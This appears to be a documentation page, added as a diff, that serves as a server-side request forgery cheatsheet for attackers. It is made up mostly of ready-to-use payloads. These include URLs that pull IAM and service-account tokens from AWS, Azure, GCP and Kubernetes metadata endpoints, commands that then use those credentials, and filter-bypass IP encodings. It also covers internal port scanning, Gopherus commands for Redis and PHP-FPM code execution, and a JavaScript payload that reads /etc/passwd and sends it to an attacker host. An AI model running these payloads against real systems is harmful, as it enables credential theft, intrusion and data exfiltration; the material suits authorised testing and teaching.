@@ -1,0 +1,269 @@
+---
+title: Cheatsheet
+description: Single-page SSRF reference - schemas, IP encodings, cloud metadata, gopher payloads, OOB.
+mitre: [T1190, T1199, T1552.005]
+d3fend: [D3-MH, D3-NI, D3-OTF]
+impact: [InternalAccess, CloudMetadata]
+sidebar:
+  order: 8
+  label: Cheatsheet
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## Detection
+
+```
+?url=http://<COLLAB>                   # OOB - confirms request reaches your host
+?url=file:///etc/passwd                # local file read
+?url=http://127.0.0.1:80               # localhost reachable
+?url=http://169.254.169.254/           # cloud metadata reachable
+```
+
+## Schemas
+
+```
+http://, https://                      # standard
+file:///etc/passwd                     # local file read
+gopher://127.0.0.1:6379/_<PAYLOAD>     # protocol smuggling (curl-only)
+ftp://<ATTACKER>/                      # FTP fetch
+dict://127.0.0.1:11211/stats           # text protocols (Memcached)
+ldap://<ATTACKER>/                     # NTLM hash steal on Java/Windows
+php://filter/convert.base64-encode/resource=index.php   # PHP source disclosure
+data://text/plain,Hello                # inline data
+jar:http://<ATTACKER>/x.jar!/file      # Java classpath fetch
+```
+
+## IP encoding bypass
+
+| Form | Value |
+| --- | --- |
+| `127.0.0.1` | Standard (the one usually filtered) |
+| `127.1` | Short-form |
+| `0.0.0.0` | Any-interface |
+| `2130706433` | Decimal |
+| `0x7f000001` | Hex |
+| `017700000001` | Octal |
+| `[::]` | IPv6 unspecified |
+| `[::1]` | IPv6 loopback |
+| `[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
+| `127.0.0.1.nip.io` | DNS resolves to 127.0.0.1 |
+
+Generate alternates:
+
+```python
+import socket, struct
+ip = "169.254.169.254"
+n = struct.unpack("!I", socket.inet_aton(ip))[0]
+print(n, hex(n), oct(n))
+# 2852039166 0xa9fea9fe 0o25177724776
+```
+
+## URL parser confusion
+
+```
+http://example.com@127.0.0.1/         # @ split - host is 127.0.0.1
+http://127.0.0.1#example.com          # fragment - server-side ignores
+http://example.com/?next=http://127.0.0.1   # path/query smuggle
+http://example.com\@127.0.0.1/        # backslash (Java)
+http://example.com.evil.com/          # subdomain trick on substring filters
+```
+
+## Cloud metadata
+
+<Tabs syncKey="cloud">
+<TabItem label="AWS">
+
+```bash
+# IMDSv1 (legacy, no auth)
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
+?url=http://169.254.169.254/latest/user-data/
+
+# IMDSv2 (token-based, requires PUT + header)
+?url=http://169.254.169.254/latest/api/token
+# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+# Method: PUT
+```
+
+Use credentials:
+
+```bash
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+aws s3 ls
+```
+
+</TabItem>
+<TabItem label="Azure">
+
+```bash
+?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com
+# Header required: Metadata: true
+```
+
+```bash
+TOKEN="<access_token>"
+curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
+```
+
+</TabItem>
+<TabItem label="GCP">
+
+```bash
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google
+
+?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json
+```
+
+</TabItem>
+<TabItem label="K8s">
+
+```bash
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
+?url=https://kubernetes.default.svc/api/v1/namespaces
+# Header: Authorization: Bearer <TOKEN>
+```
+
+```bash
+kubectl --server=https://<api> --token=$TOKEN --insecure-skip-tls-verify get pods --all-namespaces
+```
+
+</TabItem>
+</Tabs>
+
+## Internal port scan
+
+```bash
+# ffuf with length filter
+ffuf -w ports.txt:PORT -u "http://<TARGET>/?url=http://127.0.0.1:PORT" -fs 30
+
+# ffuf with regex filter (when length varies)
+ffuf -w ports.txt:PORT -u "http://<TARGET>/?url=http://127.0.0.1:PORT" -fr 'Errno 111'
+
+# Quick port wordlist
+echo -e "21\n22\n80\n443\n3306\n5000\n5432\n6379\n8009\n8080\n8443\n9090\n9200\n11211\n27017" > ports.txt
+```
+
+Common internal hostnames:
+
+```
+localhost, 127.0.0.1, 127.1, 0.0.0.0
+internal, internal.local, internal.app.local
+api, api.internal, admin, admin.internal
+host.docker.internal
+kubernetes.default.svc
+metadata, metadata.google.internal
+```
+
+## Gopher protocol smuggling
+
+Use [Gopherus](https://github.com/tarunkant/Gopherus):
+
+```bash
+git clone https://github.com/tarunkant/Gopherus
+python2 gopherus.py --exploit redis        # Redis → SSH key / cron / PHP shell
+python2 gopherus.py --exploit memcached    # Memcached store/retrieve
+python2 gopherus.py --exploit fastcgi      # PHP-FPM RCE
+python2 gopherus.py --exploit smtp         # internal SMTP send
+python2 gopherus.py --exploit mysql        # MySQL query as known user
+```
+
+Output is a gopher URL - URL-encode once more for the SSRF parameter, submit.
+
+## Local file targets
+
+```
+file:///etc/passwd
+file:///etc/shadow                              # if root
+file:///proc/self/environ                       # env vars (best first read)
+file:///proc/self/cmdline                       # process args
+file:///proc/net/tcp                            # listening sockets
+file:///root/.aws/credentials
+file:///root/.ssh/id_rsa
+file:///app/.env                                # framework secrets
+file:///var/www/html/.env
+file:///app/config/database.yml
+```
+
+## Blind SSRF - JS exfil via wkhtmltopdf
+
+```html
+<script>
+var read = new XMLHttpRequest();
+var send = new XMLHttpRequest();
+read.onload = function() {
+    if (read.readyState === 4) {
+        send.open("GET", "http://<ATTACKER>/?d=" + btoa(read.responseText), true);
+        send.send();
+    }
+};
+read.open("GET", "file:///etc/passwd", true);
+read.send();
+</script>
+```
+
+User-Agent in your callback contains `wkhtmltopdf` → JS execution available.
+
+## Time-based detection
+
+```bash
+# Reachable internal service - fast (~50ms)
+?url=http://127.0.0.1:80
+
+# Unreachable IP - slow (~10s timeout)
+?url=http://192.0.2.1                  # TEST-NET-1
+
+# Loop ports
+for p in 22 80 443 3306 6379; do
+    t=$(curl -s -o /dev/null -w "%{time_total}" "http://<TARGET>/?url=http://127.0.0.1:$p")
+    echo "$p: $t"
+done
+```
+
+## OOB listeners
+
+```bash
+# Burp Collaborator (Burp Pro)
+# Click "Copy to clipboard" - submit hostname
+
+# interactsh
+interactsh-client -v
+
+# Self-hosted
+sudo tcpdump -i any -n udp port 53      # DNS
+python3 -m http.server 80               # HTTP
+nc -lvnp 80                             # raw HTTP
+ngrok http 80                           # tunnel local server
+```
+
+## Multi-hop encoding
+
+```bash
+# N hops = N levels of URL encoding
+echo -n 'id; uname -a' | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri
+```
+
+```bash
+# Bash function for repeated chained RCE
+function chain_rce() {
+    local cmd="$1"
+    local enc=$(echo -n "$cmd" | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
+    curl -s "http://<TARGET>/?url=http%3A%2F%2Fapp1.internal%2Fload%3Fq%3Dhttp%3A%3A%2F%2F%2F%2F127.0.0.1%3A5000%2Frunme%3Fx%3D${enc}"
+}
+```
+
+## Quick decision tree
+
+1. **Confirm SSRF** - `?url=http://<COLLAB>` → check listener
+2. **Try `file://`** - `?url=file:///etc/passwd` → if works, dump source code first
+3. **Try cloud metadata** - `?url=http://169.254.169.254/...` → if AWS, IAM creds in 2 requests
+4. **Internal port scan** - ffuf with length/regex filter
+5. **Gopher to discovered services** - Gopherus generates payloads
+6. **Filter blocks something?** - IP alternates first, then `@`-split, then DNS rebinding
+7. **Output suppressed?** - OOB callback; if PDF renderer, JS exfil
